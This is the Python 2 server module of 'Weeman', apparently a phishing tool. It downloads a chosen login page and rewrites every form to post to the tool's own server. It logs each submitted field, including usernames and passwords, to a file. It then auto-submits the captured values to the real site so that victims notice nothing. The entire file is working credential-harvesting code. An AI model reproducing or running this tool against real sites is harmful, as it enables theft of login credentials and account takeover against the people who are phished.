##
## httpd.py - the main httpd server
##
## Written by @Hypsurus
##

import SimpleHTTPServer
import SocketServer
import urllib2
import cgi
import os
from socket import error as socerr
from core.config import __version__
from core.config import __codename__
from core.misc import printt
from bs4 import BeautifulSoup as bs

class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ## Set server version
    server_version = "Weeman %s (%s)" %(__version__, __codename__)

    def do_POST(self):
        post_request = []
        printt(3, "%s - sent POST request." %self.address_string())
       	form = cgi.FieldStorage(self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],})
        try:
            from core.shell import url
            logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "w+")
            logger.write("## Data for %s\n\n" %url)
            for tag in form.list:
                tmp = str(tag).split("(")[1]
                key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
                post_request.append("%s %s" %(key,value))
                printt(2, "%s => %s" %(key,value))
                logger.write("%s => %s\n" %(key,value))
            logger.close()
            from core.shell import action_url
            create_post(url,action_url, post_request)
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        except socerr as e:
            printt(3, "Something wrong: (%s) igonring ..." %str(e))
        except Exception as e:
            printt(3, "Something wrong: (%s) igonring ..." %str(e))

    def log_message(self, format, *args):
        printt(3, "Connected : %s" %(self.address_string()))
        arg = format%args
        if arg.split()[1] == "/":
            printt(3, "%s - sent GET request without parameters." %self.address_string())
        else:
            if arg.split()[1].startswith("/") and "&" in arg.split()[1]:
                printt(3, "%s - sent GET request with parameters." %self.address_string())
                printt(2, "%s" %arg.split()[1])

class weeman(object):
    def __init__(self, url,port):
        from core.shell import url
        from core.shell import port
        self.port = port
        self.httpd = None
        self.url = url
        self.form_url = None;

    def request(self,url):
            from core.shell import user_agent
            opener = urllib2.build_opener()
            opener.addheaders = [('User-Agent', user_agent)]
            return opener.open(self.url).read()

    def clone(self):
        printt(3, "Trying to get %s  ..." %self.url)
        printt(3, "Downloadng wepage ...")
        data = self.request(self.url)
        data = bs(data, "html.parser")    
        printt(3, "Modifying the HTML file ...")

        for tag in data.find_all("form"):
            tag['method'] = "post"
            tag['action'] = "ref.html"
        with open("index.html", "w") as index:
            index.write(data.prettify().encode('utf-8'))
            index.close()
        printt(3, "the HTML page will redirect to ref.html ...")
    def serve(self):
        printt(3, "\033[01;35mStarting Weeman %s server on 0.0.0.0:%d\033[00m" %(__version__, self.port))
        self.httpd = SocketServer.TCPServer(("", self.port),handler)
        self.httpd.serve_forever()
    
    def cleanup(self):
        printt(3, "\n:: Running cleanup ...")
        ## In case weeman will not create ref.html,
        ## Remove each file in diffrent check.
        if os.path.exists("index.html"):
            os.remove("index.html")
        if os.path.exists("ref.html"):
            os.remove("ref.html")

def create_post(url,action_url, post_request):
    printt(3, "Creating ref.html ...")
    red = open("ref.html","w")
    red.write("<body><form id=\"ff\" action=\"%s\" method=\"post\" >\n" %action_url)
    for post in post_request:
        key,value = post.split()
        red.write("<input name=\"%s\" value=\"%s\" type=\"hidden\" >\n" %(key,value))
    red.write("<input name=\"login\" type=\"hidden\">")
    red.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
    red.close()


